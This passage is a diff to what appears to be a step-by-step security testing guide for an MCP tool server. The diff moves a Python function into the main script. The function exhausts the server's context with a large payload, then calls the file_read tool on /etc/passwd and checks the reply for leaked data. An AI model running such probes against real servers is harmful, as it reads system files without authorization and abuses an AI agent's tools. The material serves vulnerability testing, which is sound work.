@@ -87,40 +87,31 @@ def test_context_limit(target):
     print("\n[*] Summary:")
     for size, status, data in results:
         if status != "ok":
-            print(f"  [!] {size}KB → {status.upper()}: {data[:200]}")
+            print(f"  [!] {size}KB -> {status.upper()}: {data[:200]}")
+
+def test_error_state_leak(target):
+    """After exhausting context, see if error response leaks data"""
+    send_large_payload(target, 500)
+    payload = {
+        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
+        "params": {"name": "file_read", "arguments": {"path": "/etc/passwd"}}
+    }
+    try:
+        r = requests.post(f"{target}/mcp/call", json=payload, timeout=15)
+        result = r.json()
+        if "root:" in json.dumps(result) or "last_stage_error" in json.dumps(result):
+            print("[!] ERROR STATE LEAK: Previous context visible in new request")
+    except:
+        pass
 
 if __name__ == "__main__":
     test_context_limit(TARGET)
+    test_error_state_leak(TARGET)
 ```
 
 ### Step 2 — Trigger Error State and Observe
 
-```python
-def test_error_state_leak(target):
-    """After exhausting context, see if error response leaks data"""
-    # First exhaust
-    send_large_payload(target, 500)
-    
-    # Then try a normal request
-    payload = {
-        "jsonrpc": "2.0",
-        "id": 2,
-        "method": "tools/call",
-        "params": {
-            "name": "file_read",
-            "arguments": {"path": "/etc/passwd"}
-        }
-    }
-    r = requests.post(f"{target}/mcp/call", json=payload, timeout=15)
-    result = r.json()
-    
-    # Check if previous context leaked into this response
-    if "root:" in json.dumps(result) or "last_stage_error" in json.dumps(result):
-        print("[!] ERROR STATE LEAK: Previous context visible in new request")
-
-if __name__ == "__main__":
-    test_error_state_leak(TARGET)
-```
+The `test_error_state_leak` function above is already included in the main script block above. Call it directly after `test_context_limit` for full coverage.
 
 ### Step 3 — Check for Timeout Behavior
 
